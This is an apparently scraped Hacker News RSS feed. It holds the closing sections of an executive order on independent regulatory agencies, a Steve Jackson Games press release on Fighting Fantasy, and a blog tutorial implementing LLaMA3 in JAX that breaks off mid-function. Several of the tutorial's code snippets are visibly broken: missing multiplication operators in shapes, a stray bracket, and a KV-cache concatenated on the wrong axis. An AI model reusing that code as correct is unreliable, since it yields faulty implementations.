<p>&nbsp; &nbsp; &nbsp;(a) &nbsp;review independent regulatory agencies’ obligations for consistency with the President’s policies and priorities; and  &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(b) &nbsp;consult with independent regulatory agency chairmen and adjust such agencies’ apportionments by activity, function, project, or object, as necessary and appropriate, to advance the President’s&nbsp;policies and priorities. &nbsp;Such adjustments to apportionments may prohibit independent regulatory agencies from expending appropriations on particular activities, functions, projects, or objects, so long as such restrictions are consistent with law.&nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;<span>Sec</span>.&nbsp;<span>6</span>. &nbsp;<span>Additional Consultation with the Executive Office of the President</span>. &nbsp;(a) &nbsp;Subject to subsection (b), independent regulatory agency chairmen shall regularly consult with and coordinate policies and priorities with the directors of OMB, the White House Domestic Policy Council, and the White House National Economic Council.  </p>



<p>&nbsp; &nbsp; &nbsp;(b) &nbsp;The heads of independent regulatory agencies shall establish a position of White House Liaison in their respective agencies. &nbsp;Such position shall be in grade 15 of the General Schedule and shall be placed in Schedule C of the excepted service.  </p>



<p>&nbsp; &nbsp; &nbsp;(c) &nbsp;Independent regulatory agency chairmen shall submit agency strategic plans developed pursuant to the Government Performance and Results Act of 1993&nbsp;to the Director of OMB for clearance prior to finalization.&nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;&nbsp;<span>Sec</span>.&nbsp;<span>7</span>. &nbsp;<span>Rules of Conduct Guiding Federal Employees’ Interpretation of the Law</span>. The President and the Attorney General, subject to the President’s supervision and control, shall provide authoritative interpretations of law for the executive branch. &nbsp;The President and the Attorney General’s opinions on questions of law are controlling on all employees in the conduct of their official duties.&nbsp;&nbsp;No employee of the executive branch acting in their official capacity may advance an interpretation of the law as the position of the United States that contravenes the President or the Attorney General’s opinion on a matter of law, including but not limited to the issuance of regulations, guidance, and positions advanced in litigation, unless authorized to do so by the President or in writing by the Attorney General.&nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;&nbsp;<span>Sec</span>.&nbsp;<span>8</span>. &nbsp;<span>General Provisions</span>. &nbsp;(a) &nbsp;If any provision of this order, or the application of any provision to any person or circumstance, is held to be invalid, the remainder of this order and the application of its provisions to any other persons or circumstances shall not be affected thereby. &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(b) &nbsp;Nothing in this order shall be construed to impair or otherwise affect: &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(i) &nbsp;&nbsp;the authority granted by law to an executive department, agency, or the head thereof; or&nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(ii) &nbsp;the functions of the Director of the Office of Management and Budget relating to budgetary, administrative, or legislative proposals. &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(c) &nbsp;This order shall be implemented consistent with applicable law and subject to the availability of appropriations. &nbsp;</p>



<p>&nbsp; &nbsp; &nbsp;(d) &nbsp;This order is not intended to, and does not, create any right or benefit, substantive or procedural, enforceable at law or in equity by any party against the United States, its departments, agencies, or entities, its officers, employees, or agents, or any other person. &nbsp;</p>
</div>
</main>



</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Steve Jackson Games Is Bringing the Fighting Fantasy Books to the US (103 pts)]]></title>
            <link>https://www.sjgames.com/fightingfantasy/</link>
            <guid>43098626</guid>
            <pubDate>Wed, 19 Feb 2025 04:35:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sjgames.com/fightingfantasy/">https://www.sjgames.com/fightingfantasy/</a>, See on <a href="https://news.ycombinator.com/item?id=43098626">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="contentwrapper">


          <div>
            <!-- Header Section --> <!-- <b><i>Fighting Fantasy</i></b> -->
            

            <p><b><i>Steve Jackson Games Tapped As
                    US <b><i>Fighting Fantasy</i></b> Publisher</i></b> <br>
                <i>Classic Solo Adventure Game Books Return After More Than 20 Years </i><br>
              </p>

            <div>
              <!-- <b><i>Fighting Fantasy</i></b> -->
              <p>AUSTIN, TX 10/17/24 – In 1982, British game designers Sir Ian Livingstone and Steve Jackson
                introduced <b><i>Fighting Fantasy</i></b>, a revolutionary set of solo adventure books that combined
                nonlinear narratives with dice-rolling tabletop RPG mechanics. Now, this fantastical,
                multi-million-selling book series returns to the United States thanks to an historic 50-book publishing
                collaboration with Steve Jackson Games. The first books in the series will be available in early 2025.
              </p>

              <p><b><i>Fighting Fantasy</i></b> debuted with <b><i>The Warlock of Firetop Mountain</i></b> in 1982.
                Since then, over 20 million copies of the exciting series have been sold worldwide. In <b><i>Fighting
                    Fantasy</i></b>, players embark on a solo adventure where their decisions – and dice rolls
                – determine the outcome of the story. This combination of nonlinear narrative and classic tabletop
                action sets the series apart from other gamebook franchises.</p>

              <p><b><i>Fighting Fantasy</i></b> co-creators Sir Ian Livingstone and Steve Jackson (UK) stated how
                thrilled they were to sign a US publishing agreement for <b><i>Fighting Fantasy</i></b> with Steve
                Jackson Games. Sir Ian says: </p>

              <p><i>"To have a new publisher in the USA is a special moment in the history of <b><i>Fighting
                      Fantasy</i></b>. We have known Steve Jackson (US) for more than 40 years, having distributed Steve
                  Jackson Games in the 1980s when we owned Games Workshop. Steve also wrote three fantastic
                  <b><i>Fighting Fantasy</i></b> books which caused a lot of confusion at the time when people didn't
                  realize there were two Steve Jacksons! We look forward to exciting times ahead in the USA for new and
                  existing <b><i>Fighting Fantasy</i></b> fans." </i></p>

              <p> The first five books will be released in early 2025, with an additional five volumes later that year. <a href="http://eepurl.com/i1pTxA">SIGN UP</a> for the latest news about Fighting Fantasy from Steve Jackson Games!
              </p>

              <p><b>About Steve Jackson Games</b>: Steve Jackson Games, based in Austin, Texas, has published games,
                game books, and magazines since 1980. SJ Games has an extensive catalog of hit games, including
                <b><i>Munchkin</i></b>, <b><i>Zombie Dice</i></b>, <b><i>Car Wars</i></b>, the <b><i>GURPS</i></b>
                roleplaying system, <b><i>Ogre</i></b>, <b><i>The Fantasy Trip</i></b>, and more.
                <b><i>Munchkin</i></b>, <b><i>Ogre</i></b>, and <b><i>Illuminati</i></b> also have digital versions on
                Steam and other platforms, bringing tabletop classics to a new generation of fans.</p>
            </div>
          </div> 

          <p><a href="https://www.sjgames.com/fightingfantasy/img/steve-ian.png"><img src="https://www.sjgames.com/fightingfantasy/img/steve-ian.png" alt="Steve and Ian"></a>
          </p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Thoughts on Daylight Computer (265 pts)]]></title>
            <link>https://jon.bo/posts/daylight-computer-1/</link>
            <guid>43098318</guid>
            <pubDate>Wed, 19 Feb 2025 03:41:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jon.bo/posts/daylight-computer-1/">https://jon.bo/posts/daylight-computer-1/</a>, See on <a href="https://news.ycombinator.com/item?id=43098318">Hacker News</a></p>
Couldn't get https://jon.bo/posts/daylight-computer-1/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Implementing LLaMA3 in 100 Lines of Pure Jax (146 pts)]]></title>
            <link>https://saurabhalone.com/blogs/llama3/web</link>
            <guid>43097932</guid>
            <pubDate>Wed, 19 Feb 2025 02:37:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://saurabhalone.com/blogs/llama3/web">https://saurabhalone.com/blogs/llama3/web</a>, See on <a href="https://news.ycombinator.com/item?id=43097932">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <article>
                <h2>Implementing LLaMA3 in 100 Lines of Pure Jax</h2>
                
                

                

                <div>

                    <p>In this post, we'll implement <strong>llama3</strong> from scratch using pure <strong>jax</strong> in just 100 lines of code. Why jax? Because I think it has good aesthetics. Also jax looks like a NumPy wrapper but it has some cool features like <strong>xla</strong>; a linear algebra accelerator, <strong>jit</strong>, <strong>vmap</strong>, <strong>pmap</strong> etc., which makes your training go brr brr.</p>
                    <p>Jax is one of the first libraries which strongly focuses on the soul of <strong>pure functional programming</strong> which makes it more cool.<sup>1</sup></p>
                    <p><strong>Note :</strong></p>
                    <div>
                            <ul>
                                <li>This post assumes familiarity with Python and basic understanding of transformer architectures.</li>
                                <li>This implementation is  for educational purposes, which means it is not for any production stuff but it covers all components of the model.<sup>2</sup></li>
                                <li>If you don't wanna read this amazing blog post then you can check out all the code at.<sup>3</sup></li>
                            </ul>
                        </div>

                    <p><img src="https://saurabhalone.com/blogs/llama3/images/newllama.png" alt="Llama architecture">
                        <img src="https://saurabhalone.com/blogs/llama3/images/llamadark.png" alt="Llama architecture">
                    </p>
                </div>


                <div>
                    <h2>Table of Contents</h2>
                    <nav>
                        <ul>
                            <li><a href="#section-1">1. LLaMA3</a></li>
                            <li><a href="#section-2">2. Model Weights Initialization</a></li>
                            <li><a href="#section-3">3. Tokenization</a></li>
                            <li><a href="#section-4">4. Embeddings</a></li>
                            <li><a href="#section-5">5. Root Mean Square Layer Normalization</a></li>
                            <li><a href="#section-6">6. Rotary Positional Encoding</a></li>
                            <li><a href="#section-7">7. Group-Query Attention</a></li>
                            <li><a href="#section-8">8. Transformer-Block</a></li>
                            <li><a href="#section-9">9. Forward-Pass</a></li>
                            <li><a href="#section-10">10. Dataset</a></li>
                            <li><a href="#section-11">11. Loss Function</a></li>
                            <li><a href="#update function">12. Update Function</a></li>
                            <li><a href="#training-loop">13. Training-Loop</a></li>
                            <li><a href="#results">14. Results</a></li>
                        </ul>
                    </nav>
                </div>


                

                <div>
                    <h2 id="section-1">LLaMA3</h2>
                    <p> 
                        At its core, LLaMA 3 is a decoder only transformer language model that generates text one token at a time, 
                        building on previous tokens to predict what comes next ; like completing a sentence word by word.
                   </p>
                    <p>
                        So lets fucking go !! we're doing it, get your diet coke !! First, we will begin with setting up device<sup>5</sup> and configuring the model.
                    </p>
                </div>



<div>
    <pre><code><span># Configure JAX to use GPU and prevent memory preallocation</span>
<span>os</span>.<span>environ</span>[<span>'JAX_PLATFORM_NAME'</span>] = <span>'gpu'</span>
<span>os</span>.<span>environ</span>[<span>'XLA_PYTHON_CLIENT_PREALLOCATE'</span>] = <span>'false'</span>
<span>print</span>(<span>"JAX devices:"</span>, <span>jax</span>.<span>devices</span>())</code></pre>
</div>

<p> So these are the hyperparameter we need to train approximately 2 million parameters model.</p>

<div>
    <pre><code><span># Define model hyperparameters</span>
<span>args</span> = <span>ModelArgs</span>(
    <span>vocab_size</span>=<span>enc</span>.<span>n_vocab</span>,    <span># Size of vocabulary</span>
    <span>dim</span>=<span>256</span>,                <span># Embedding dimension</span>
    <span>n_layers</span>=<span>6</span>,            <span># Number of transformer layers</span>
    <span>n_heads</span>=<span>8</span>,             <span># Number of attention heads</span>
    <span>n_kv_heads</span>=<span>4</span>,          <span># Number of key-value heads for GQA</span>
    <span>max_seq_len</span>=<span>512</span>,       <span># Maximum sequence length</span>
    <span>norm_eps</span>=<span>1e-5</span>          <span># Normalization epsilon</span>
)</code></pre></div>

    
<div>
    <h2 id="section-2">Model Weights Initialization</h2>


    
    
<p>
  In pure JAX, we don't use classes like in PyTorch. We use only pure fucntions why ? cause it makes our code more predictable and easier to parallelize.
   
  A pure function always returns the same output for the same input and doesn’t cause any side effects.<sup>6</sup> For example, if you call F(x), you'll always get the same y.
</p>

<p>
  Since we aren’t using a framework like PyTorch’s <strong>nn.Module</strong> to automatically track parameters, we must initialize and update our weights manually.
</p>

<p>
  Handling randomness is also different. Instead of relying on a single global seed as in NumPy or PyTorch, in <strong>jax</strong> we need to manage randomness with explicit pseudo-random number generator (PRNG) keys. Each random operation gets its own unique key, which is derived by splitting a parent key. This will help in reproducibility and parallelism.
</p>

<p>For example, below you can see we are creating a key and splitting it into sub keys and then providing that key to the function which involves the randomness.</p>

</div>


<div>
    <pre><code><span># Generate and split random keys for reproducibility</span>
key = jax.random.PRNGKey(<span>42</span>)

<span># Create a new subkey for random operations</span>
key, subkey = jax.random.split(key)

<span># Initialize random weights using the subkey</span>
weights = jax.random.normal(subkey, (<span>784</span>, <span>512</span>))
</code></pre>
</div>           




<p>
        Now lets start with our Model Weights Initialization, first we create the random values for our parameters with normal ditribuition.
        </p>


<div>
    <pre><code><span># Initialize weights with optional scaling</span>
<span>def</span> <span>init_weight</span>(key, shape, scale=<span>None</span>):
    <span># Calculate default scale if none provided</span>
    scale = <span>1.0</span> / math.sqrt(shape[0]) <span>if</span> scale <span>is</span> <span>None</span> <span>else</span> scale
    <span># Return scaled normal distribution</span>
    <span>return</span> jax.random.normal(key, shape) * scale
</code></pre></div>



<div>
    <p>
        Next, we'll identify all the learnable parameters of our model(llama3), assign each a unique key to ensure reproducibility, and apply the initialization process to them.
   </p>
   <p>
        Since weights are essentially numbers stored in arrays, we can use dictionaries to manage them as key-value pairs. </p>
    <p>  First we will start with attention module which has four trainable parameters.
   </p> 
</div>

<div>
    <pre><code><span># Initialize attention weights for multi-head attention</span>
<span>def</span> <span>init_attention_weights</span>(<span>key</span>, <span>dim</span>, <span>n_heads</span>, <span>n_kv_heads</span>):
    <span># Split key for each weight matrix</span>
    <span>keys</span> = jax.random.split(<span>key</span>, <span>4</span>)
    <span>head_dim</span> = <span>dim</span> // <span>n_heads</span>
    <span># Return dictionary of weight matrices</span>
    <span>return</span> {
    <span>'wq'</span>: init_weight(<span>keys</span>[<span>0</span>], (<span>dim</span>, <span>n_heads</span> <span>head_dim</span>)),  <span># Query weights</span>
    <span>'wk'</span>: init_weight(<span>keys</span>[<span>1</span>], (<span>dim</span>, <span>n_kv_heads</span> <span>head_dim</span>)),  <span># Key weights</span>
    <span>'wv'</span>: init_weight(<span>keys</span>[<span>2</span>], (<span>dim</span>, <span>n_kv_heads</span> <span>head_dim</span>)),  <span># Value weights</span>
    <span>'wo'</span>: init_weight(<span>keys</span>[<span>3</span>], (<span>n_heads</span> <span>head_dim</span>, <span>dim</span>))    <span># Output projection</span>
    }</code></pre>
    </div>

<p>Next we have our Feed-forward network which has 3 trainable parameters.</p>
<div>
<pre><code><span># Initialize feed-forward network weights</span>
<span>def</span> <span>init_ffn_weights</span>(key, dim):
    <span># Split key into three for each weight matrix</span>
    keys = jax.random.split(key, <span>3</span>)
    <span>return</span> {
        <span>'w1'</span>: <span>init_weight</span>(keys[<span>0</span>], (dim, <span>4</span> * dim)),  <span># First projection</span>
        <span>'w2'</span>: <span>init_weight</span>(keys[<span>1</span>], (<span>4</span> * dim, dim)),  <span># Output projection</span>
        <span>'w3'</span>: <span>init_weight</span>(keys[<span>2</span>], (dim, <span>4</span> * dim))   <span># Gate projection</span>
    }
</code></pre>
</div>
<p>Then we combine our weights into transformer block, adding two additional parameters for two layers of RMSNorm.</p>

<div>
    <pre><code><span># Initialize a complete transformer block</span>
<span>def</span> <span>init_transformer_block</span>(<span>key</span>, <span>dim</span>, <span>n_heads</span>, <span>n_kv_heads</span>):
    <span># Split key for each component</span>
    <span>keys</span> = jax.random.split(<span>key</span>, <span>4</span>)
    <span>return</span> {
    <span>'attention'</span>: init_attention_weights(<span>keys</span>[<span>0</span>], <span>dim</span>, <span>n_heads</span>, <span>n_kv_heads</span>),  <span># Self-attention</span>
    <span>'ffn'</span>: init_ffn_weights(<span>keys</span>[<span>1</span>], <span>dim</span>),  <span># Feed-forward network</span>
    <span>'attention_norm'</span>: init_weight(<span>keys</span>[<span>2</span>], (<span>dim</span>,), scale=<span>1.0</span>),  <span># Pre-attention norm</span>
    <span>'ffn_norm'</span>: init_weight(<span>keys</span>[<span>3</span>], (<span>dim</span>,), scale=<span>1.0</span>)  <span># Pre-ffn norm</span>
    }</code></pre>
    </div>

    <p>Finally we assemble <strong>Model's Weights Initialization</strong> in one place.</p>

    
    <div>
        <pre><code><span># Initialize complete model parameters</span>
<span>def</span> <span>init_model_params</span>(<span>key</span>, <span>vocab_size</span>, <span>dim</span>, <span>n_layers</span>, <span>n_heads</span>, <span>n_kv_heads</span>):
    <span># Split keys for different components</span>
    <span>keys</span> = jax.random.split(<span>key</span>, <span>4</span>)
    <span>params</span> = {
        <span>'token_embedding'</span>: init_weight(<span>keys</span>[<span>0</span>], (<span>vocab_size</span>, <span>dim</span>)),  <span># Token embeddings</span>
        <span>'norm_f'</span>: init_weight(<span>keys</span>[<span>1</span>], (<span>dim</span>,), scale=<span>1.0</span>),  <span># Final normalization</span>
        <span>'output'</span>: init_weight(<span>keys</span>[<span>2</span>], (<span>dim</span>, <span>vocab_size</span>))  <span># Output projection</span>
    }
    <span># Initialize transformer blocks</span>
    <span>block_keys</span> = jax.random.split(<span>keys</span>[<span>3</span>], <span>n_layers</span>)
    <span>params</span>[<span>'blocks'</span>] = [
        init_transformer_block(<span>k</span>, <span>dim</span>, <span>n_heads</span>, <span>n_kv_heads</span>)
        <span>for</span> <span>k</span> <span>in</span> <span>block_keys</span>
    ]
    <span>return</span> <span>params</span></code></pre>
    </div>


<div>
    <h2 id="section-3">Tokenization</h2>

    <p>
     Tokenization means dividing the text into words and subwords (tokens). 
        
      We will be using <bold>Byte Pair Encoding (BPE)</bold> for training our model (BPE was used in training Llama 3).<sup>7</sup>
    I will not build bpe from scratch we will use <bold>tiktoken</bold> library by openai for bpe.</p>
</div>





<div><pre><code><span>import</span> jax.numpy <span>as</span> jnp
<span>import</span><span></span> tiktoken

<span># Load GPT-2 BPE encoding</span>
enc = tiktoken.get_encoding(<span>"gpt2"</span>)


<span># reading a line from</span> 
<span>with</span> <span>open</span>(<span>'../shakespeare.txt'</span>, <span>'r'</span>) <span>as</span> f:
    text = f.readlines()[<span>0</span>]  <span># Take the first line</span>

<span># Encode the text into token IDs</span>
tokens = enc.encode(text)
data = jnp.array(tokens, dtype=jnp.int32)  <span># Store as JAX array</span>

<span># Decode back to text</span>
decoded_text = enc.decode(tokens)

<span>print</span>(<span>"original Text:"</span>, text.strip())
<span>print</span>(<span>"encoded Tokens:"</span>, tokens)
<span>print</span>(<span>"decoded Text:"</span>, decoded_text)

<span>## Ouput ##

# Original Text: From fairest creatures we desire increase,
# Encoded Tokens: [220, 3574, 37063, 301, 8109, 356, 6227, 2620, 11, 198]
# Decoded Text:   From fairest creatures we desire increase,</span></code></pre>
</div> 


<div>
    <h2 id="section-4">Embeddings</h2>

    <p>
        We cannot provide tokens directly to a model because tokens are discrete, while neural networks operate on continuous numerical data this is important for performing mathematical operations. Therefore, we use an embedding layer to convert the discrete tokens into a continuous vector space. These embeddings also help encode the semantic and syntactic relationships between tokens.
   </p>
        
   <p><img src="https://saurabhalone.com/blogs/llama3/images/lemb.png" alt="Llama architecture">
            <img src="https://saurabhalone.com/blogs/llama3/images/demb.png" alt="Llama architecture">
   </p> 

   <p> 
       There are two types of embeddings: static and dynamic. We use dynamic embeddings to train LLMs. Why? Because static embeddings work well for finding similarities between words and representing them in a similar vector space, as seen in the first image. 
   </p>
   <p>However, they suffer from semantic ambiguity, as shown in the second image.  
       This is where <b>Self-Attention</b> comes in, it refines these embeddings to incorporate context. So, we start with random embeddings and update them according to the context.  
   </p>
</div>


<div><pre><code><span># Converting the input tokens into embeddings</span>

h = params[<span>"token_embedding"</span>][inputs]

<span># token_embedding is a matrix of shape (vocab_size, dim).</span>
<span># inputs are token IDs (integers).</span>
<span># token_embedding is a matrix of shape (vocab_size, dim).</span></code></pre>
</div>


<div>
    <h2 id="section-5">Root Mean Square Layer Normalization</h2>
    <p>
        RMS normalization is an important layer in llama3 models. It helps keep the training stable by making sure that the numbers in the network don’t become too high or too low. This balance is very important, especially in deep networks.
      </p>
        <p><img src="https://saurabhalone.com/blogs/llama3/images/rsmnorm.png" alt="Llama architecture">
     <img src="https://saurabhalone.com/blogs/llama3/images/rsmnorm.png" alt="Llama architecture">
</p>
</div> 


<div><pre><code><span># RMS Norm function for stabilizing training</span>
<span>def</span> <span>rms_norm</span>(x, weight, eps=<span>1e-5</span>):
    <span># Calculate variance across last dimension</span>
    variance = jnp.mean(jnp.square(x), axis=-<span>1</span>, keepdims=<span>True</span>)                    
    <span># Normalize and scale</span>
    <span>return</span> x * weight * jnp.reciprocal(jnp.sqrt(variance + eps))
</code></pre></div>
    

<div>
    <h2 id="section-6">Rotary Positional Encoding</h2>
    <p>
  Transformers don't naturally know the order of tokens, so we need to add some position info. In llama3 to solve this we have ROPE. It does this by “rotating” the query and key vectors based on their position.<sup>8</sup>
</p>

<p><img src="https://saurabhalone.com/blogs/llama3/images/rope.png" alt="Llama architecture">
    <img src="https://saurabhalone.com/blogs/llama3/images/rope2.png" alt="Llama architecture">
</p>

<p><strong>How It Works: </strong></p>


<p>

    <strong>Precompute Rotation Factors:</strong>
    First we create a table of rotation factors using a range of frequencies. This means each token gets its own unique rotation angle.
  </p>
</div>


   

<div>
    <pre><code><span># Compute rotary position embeddings</span>
<span>def</span> <span>precompute_freqs_cis</span>(<span>dim</span>: <span>int</span>, <span>end</span>: <span>int</span>, <span>theta</span>: <span>float</span> = <span>10000.0</span>):
    <span># Generate frequency bands</span>
    <span>freqs</span> = <span>1.0</span> / (<span>theta</span> ** (jnp.arange(<span>0</span>, <span>dim</span> // <span>2</span>, dtype=jnp.float32) / <span>dim</span>))
    <span># Generate position indices</span>
    <span>t</span> = jnp.arange(<span>end</span>, dtype=jnp.float32)
    <span># Compute outer product</span>
    <span>freqs</span> = jnp.outer(<span>t</span>, <span>freqs</span>)
    <span># Convert to complex exponential</span>
    <span>return</span> jnp.complex64(jnp.exp(<span>1j</span> * <span>freqs</span>))</code></pre>
</div>


<div>
<p><strong>Apply the Rotation:</strong></p>
<p>
    <strong>Pair Up Features:</strong>  
     we reshape the vectors so that every two numbers form a pair; imagine them as the real and imaginary parts of a complex number.
  </p>
  <p>
    <strong>Rotate:</strong>  
    We multiply these complex numbers by our precomputed rotation factors. This rotates each pair in the complex plane.
  </p>
  <p>
    <strong>Convert Back:</strong>  
    Finally, we split the rotated complex numbers back into their real and imaginary parts to restore the original shape.
  </p>
<p>
    <strong>Math Behind It:</strong>
    For each pair \((x_{2i}, x_{2i+1})\), the rotation is given by:
    <br>
    \[
    \begin{pmatrix} x'_{2i} \\ x'_{2i+1} \end{pmatrix} =
    \begin{pmatrix} \cos(\theta_i) &amp; -\sin(\theta_i) \\ \sin(\theta_i) &amp; \cos(\theta_i) \end{pmatrix}
    \begin{pmatrix} x_{2i} \\ x_{2i+1} \end{pmatrix}
    \]
    where \(\theta_i\) is the rotation angle for that token.
    In short, ROPE embeds positional information directly into the token features by rotating them. This way attention module gets the info about token order without extra position vectors.
  </p>
  
  <!-- Optional: Include MathJax for rendering math formulas -->
  
</div>  
                            
<div>
    <pre><code><span># Apply rotary embeddings to queries and keys</span>
<span>def</span> <span>apply_rotary_emb</span>(<span>xq</span>, <span>xk</span>, <span>freqs_cis</span>):
    <span># Reshape inputs for complex multiplication</span>
    xq_r, xk_r = jnp.reshape(<span>xq</span>, (*<span>xq</span>.shape[:-1], -<span>1</span>, <span>2</span>)),    
    jnp.reshape(<span>xk</span>, (*<span>xk</span>.shape[:-1], -<span>1</span>, <span>2</span>))
    
    <span># Convert to complex numbers</span>
    xq_complex = jnp.complex64(xq_r[..., <span>0</span>] + <span>1j</span> * xq_r[..., <span>1</span>])
    xk_complex = jnp.complex64(xk_r[..., <span>0</span>] + <span>1j</span> * xk_r[..., <span>1</span>])
    
    <span># Reshape frequencies for broadcasting</span>
    freqs_cis = jnp.reshape(<span>freqs_cis</span>, (<span>1</span>, <span>freqs_cis</span>.shape[<span>0</span>], <span>1</span>, <span>freqs_cis</span>.shape[<span>1</span>]))
    
    <span># Apply rotation through complex multiplication</span>
    xq_out = xq_complex * <span>freqs_cis</span>
    xk_out = xk_complex * <span>freqs_cis</span>
    
    <span># Convert back to real numbers and reshape</span>
    <span>xq</span> = jnp.stack([jnp.real(xq_out), jnp.imag(xq_out)], axis=-<span>1</span>).reshape(<span>xq</span>.shape)
    <span>xk</span> = jnp.stack([jnp.real(xk_out), jnp.imag(xk_out)], axis=-<span>1</span>).reshape(<span>xk</span>.shape)
    
    <span>return</span> <span>xq</span>, <span>xk</span>
</code></pre>
</div>

<div>
    <h2 id="section-7">Group-Query Attention</h2>

    <p>
      Now it's time for attention. Grouped Query Attention (GQA) is an optimized version of Multi-Head Attention that improves efficiency by sharing key and value representations among multiple query heads. This reduces computational overhead and memory usage, enabling faster inference and better scaling for transformer models.
    At it's core, it's just self-attention but with some modification.
    </p>

    
    
    <p><strong>Scaled Dot-Product Attention:</strong></p>
    <p>
    \[
    A = \text{softmax} \left( \frac{Q K^T}{\sqrt{d_h}} \right) V
    \]
    </p>





<div><pre><code><span># Attention mechanism with grouped-query attention</span>
<span>def</span> <span>attention</span>(<span>params, x, mask, freqs_cis, n_heads, n_kv_heads, cache=None, position=0</span>):
    <span># Get input dimensions</span>
    <span>B</span>, <span>T</span>, <span>C</span> = <span>x</span>.<span>shape</span>
    <span>head_dim</span> = <span>C</span> // <span>n_heads</span>
    
    <span># Project inputs to queries, keys, and values</span>
    <span>q</span> = <span>jnp</span>.<span>dot</span>(<span>x</span>, <span>params</span>[<span>'wq'</span>]).<span>reshape</span>(<span>B</span>, <span>T</span>, <span>n_heads</span>, <span>head_dim</span>)
    <span>k</span> = <span>jnp</span>.<span>dot</span>(<span>x</span>, <span>params</span>[<span>'wk'</span>]).<span>reshape</span>(<span>B</span>, <span>T</span>, <span>n_kv_heads</span>, <span>head_dim</span>)
    <span>v</span> = <span>jnp</span>.<span>dot</span>(<span>x</span>, <span>params</span>[<span>'wv'</span>]).<span>reshape</span>(<span>B</span>, <span>T</span>, <span>n_kv_heads</span>, <span>head_dim</span>)
    
    <span># Apply rotary embeddings</span>
    <span>q</span>, <span>k</span> = <span>apply_rotary_emb</span>(<span>q</span>, <span>k</span>, <span>freqs_cis</span>[<span>position</span>:<span>position</span> + <span>T</span>])
    
    <span># Handle cache for inference</span>
    <span>if</span> <span>cache</span> <span>is not None</span>:
        <span>k</span> = <span>jnp</span>.<span>concatenate</span>([<span>cache</span>[0], <span>k</span>], <span>axis</span>=-<span>1</span>])
        <span>v</span> = <span>jnp</span>.<span>concatenate</span>([<span>cache</span>[1], <span>v</span>], <span>axis</span>=-<span>1</span>])
    <span>new_cache</span> = (<span>k</span>, <span>v</span>)
    
    <span># Repeat k/v heads for grouped-query attention</span>
    <span>k</span> = <span>repeat_kv</span>(<span>k</span>, <span>n_heads</span> // <span>n_kv_heads</span>)
    <span>v</span> = <span>repeat_kv</span>(<span>v</span>, <span>n_heads</span> // <span>n_kv_heads</span>)
    
    <span># Compute attention scores and apply attention</span>
    <span>q</span>, <span>k</span>, <span>v</span> = <span>map</span>(<span>lambda</span> <span>x</span>: <span>x</span>.<span>transpose</span>(0, 2, 1, 3), (<span>q</span>, <span>k</span>, <span>v</span>))
    <span>scores</span> = <span>jnp</span>.<span>matmul</span>(<span>q</span>, <span>k</span>.<span>transpose</span>(0, 1, 3, 2)) / <span>math</span>.<span>sqrt</span>(<span>head_dim</span>)
    
    <span># Apply attention mask if provided</span>
    <span>if</span> <span>mask</span> <span>is not None</span>:
        <span>scores</span> = <span>scores</span> + <span>mask</span>[:, :, :<span>T</span>, :<span>T</span>]
    
    <span># Compute attention weights and final output</span>
    <span>scores</span> = <span>jax</span>.<span>nn</span>.<span>softmax</span>(<span>scores</span>, <span>axis</span>=-1)
    <span>output</span> = <span>jnp</span>.<span>matmul</span>(<span>scores</span>, <span>v</span>)
    <span>output</span> = <span>output</span>.<span>transpose</span>(0, 2, 1, 3).<span>reshape</span>(<span>B</span>, <span>T</span>, -1)
    
    <span>return</span> <span>jnp</span>.<span>dot</span>(<span>output</span>, <span>params</span>[<span>'wo'</span>]), <span>new_cache</span>
</code></pre></div>

<p><strong>KV-cache : </strong>It stores previously computed key (K) and value (V) tensors from past tokens. We can cache this kv-cache during inference.</p>


<p><img src="https://saurabhalone.com/blogs/llama3/images/lightkv.png" alt="Llama architecture">
    <img src="https://saurabhalone.com/blogs/llama3/images/darkkv.png" alt="Llama architecture">
</p>

<div><pre><code></code><span>if</span> <span>cache</span> <span>is not None</span>:
    <span>k</span> = <span>jnp</span>.<span>concatenate</span>([<span>cache</span>[0], <span>k</span>], <span>axis</span>=-<span>1</span>)  
    <span>v</span> = <span>jnp</span>.<span>concatenate</span>([<span>cache</span>[1], <span>v</span>], <span>axis</span>=-<span>1</span>)  
<span>new_cache</span> = (<span>k</span>, <span>v</span>)  
</pre></div>

</div>



<div>
    <h2 id="section-8">Feed-forward</h2>

    <p>This is simple feed-forward network with <strong>SiLU</strong> activation function. </p>
    

<div>
    <pre><code><span>def</span> <span>feed_forward</span>(<span>params</span>, <span>x</span>):
    
    <span>w3_</span> = <span>jnp</span>.<span>dot</span>(<span>x</span>, <span>params</span>[<span>'w3'</span>])

    <span># SwiGLU(a,b)=SiLU(a)⊙b 
    <span>activated</span> = <span>jax</span>.<span>nn</span>.<span>silu</span>(<span>w3_</span>)
    
    
    <span>w1_</span> = <span>jnp</span>.<span>dot</span>(<span>x</span>, <span>params</span>[<span>'w1'</span>])
    
    
    <span>combined</span> = <span>activated</span> * <span>w1_</span>
    
    <span># Final output projection with w2</span>
    <span>output</span> = <span>jnp</span>.<span>dot</span>(<span>combined</span>, <span>params</span>[<span>'w2'</span>])
    
    <span>return</span> <span>output</span>
</span></code></pre>
</div>




</div>

<div>
    <h2 id="section-9">Transformer-block</h2>

    <p>
        This is where all the important components come together in the transformer block. We unpack the pre-initialized weights and distribute them to their respective layers. The transformer blocks include attention, normalization, feed-forward processing layers and residual connections.
      </p>
    
</div>

<div>
    <pre><code><span># Transformer block implementation</span>
<span>def</span> transformer_block(<span>params</span>, <span>x</span>, <span>mask</span>, <span>freqs_cis</span>, <span>n_heads</span>, <span>n_kv_heads</span>, <span>cache</span>=<span>None</span>, <span>position</span>=<span>0</span>):
    <span># Apply attention with normalization and residual connection</span>
    <span>attn_output</span>, <span>new_cache</span> = attention(
        <span>params</span>[<span>'attention'</span>],
